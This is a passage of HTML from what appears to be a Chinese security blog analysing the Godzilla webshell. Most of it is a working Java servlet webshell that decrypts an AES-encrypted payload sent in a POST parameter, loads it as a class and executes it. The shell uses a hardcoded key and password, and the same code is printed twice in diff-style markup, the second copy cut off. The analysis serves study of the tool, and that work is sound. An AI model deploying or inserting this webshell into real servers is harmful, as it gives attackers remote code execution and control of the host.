-            ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span>BigInteger</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">Class</span> base64<span class="token punctuation">;</span>
-        <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
-        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-            base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.Base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token class-name">Object</span> <span class="token class-name">Encoder</span> <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getEncoder"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>base64<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"encodeToString"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Encoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-                base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.BASE64Encoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token class-name">Object</span> <span class="token class-name">Encoder</span> <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"encode"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Encoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span><span class="token class-name">String</span> bs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">Class</span> base64<span class="token punctuation">;</span>
-        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
-        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-            base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.Base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getDecoder"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>base64<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decode"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-                base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.BASE64Decoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decodeBuffer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s<span class="token punctuation">,</span> <span class="token keyword">boolean</span> m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
-        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-            <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span> c <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            c<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>m <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span>SecretKeySpec</span><span class="token punctuation">(</span>xc<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//根据m的值判断是加密还是解密，m是true的时候变量为1，这时候表示加密模式，反之是解密模式</span>
-            <span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token class-name">Class</span> <span class="token function">defClass</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">URLClassLoader</span> urlClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">Method</span> defMethod <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"defineClass"</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        defMethod<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> defMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>urlClassLoader<span class="token punctuation">,</span> classBytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classBytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token annotation punctuation">@Override</span>
-    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span>payload <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
-                payload <span class="token operator">=</span> <span class="token function">defClass</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//用于第一次接受请求初始化payload</span>
-            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token comment">//                Object f = payload.newInstance(); </span>
-                <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"basic.payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//本地加载payload，用于动态调试</span>
-                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                f<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>在哥斯拉主界面，点击测试会在burp发送两次请求，然后哥斯拉会弹框出现Success，这时候再点击确定，哥斯拉会发起第三次请求，先分析这三次请求的数据包以及哥斯拉都做了什么事情。<br><img src="/2022/05/17/godzilla/1.png"></p>
-<h3 id="第一次请求"><a href="#第一次请求" class="headerlink" title="第一次请求"></a>第一次请求</h3>
-	
-
-	</div>
-  <a type="button" href="/2022/05/17/godzilla.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="分析背景"><a href="#分析背景" class="headerlink" title="分析背景"></a>分析背景</h2><p>起源于<code>Y4er</code>师傅发的两篇文章：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1513/">Java反序列化注入冰蝎内存马相关踩坑笔记</a></li>
-<li><a target="_blank" rel="noopener" href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">解决哥斯拉内存马pagecontext的问题</a></li>
-</ul>
-<p>对其中的原因比较好奇，所以尝试对哥斯拉做了一次原理分析，测试代码在<a target="_blank" rel="noopener" href="https://github.com/JKme/MemoryShellDemo">MemoryShellDemo</a>。文章可能有错误的地方，可以在<a target="_blank" rel="noopener" href="https://github.com/JKme/JKme.github.io/issues">issue</a>留言。</p>
-<h2 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h2><p>从哥斯拉的源代码里面扣出来<code>godzilla\shells\payloads\java\assets\payload.classs</code>文件，使用<a target="_blank" rel="noopener" href="https://github.com/leibnitz27/cfr">https://github.com/leibnitz27/cfr</a>反编译之后，在idea里面新建<code>payload.java</code>文件，然后修改误报错，<a target="_blank" rel="noopener" href="https://gist.github.com/JKme/690c9562155c019570afd5ab06356658">这里</a>是反编译好之后的文件。<code>payload.java</code>实现了大部分的shell操作，比如查看文件、执行命令、数据库连接等等</p>
-<p>新建一个<code>HelloServlet.java</code>，用于动态调试：</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">basic</span><span class="token punctuation">;</span>
-
-<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span>
-
-<span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"helloServlet"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"/hello"</span><span class="token punctuation">)</span>
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>
-    <span class="token class-name">String</span> xc <span class="token operator">=</span> <span class="token string">"3c6e0b8a9c15224a"</span><span class="token punctuation">;</span>  <span class="token comment">//定义AES加解密的Key，哥斯拉会把返回的response也做一次加密</span>
-    <span class="token class-name">String</span> pass <span class="token operator">=</span> <span class="token string">"pass"</span><span class="token punctuation">;</span>       
-    <span class="token class-name">String</span> md5 <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span>pass <span class="token operator">+</span> xc<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//用于返回response在头和尾部插入标识符，头部取md5的前16位字符串，尾部取md5的后16位字符串</span>
-    <span class="token class-name">Class</span> payload<span class="token punctuation">;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">String</span> ret <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
-        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span> m<span class="token punctuation">;</span>
-            m <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"MD5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            m<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span>BigInteger</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">Class</span> base64<span class="token punctuation">;</span>
-        <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
-        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-            base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.Base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token class-name">Object</span> <span class="token class-name">Encoder</span> <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getEncoder"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>base64<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"encodeToString"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Encoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span 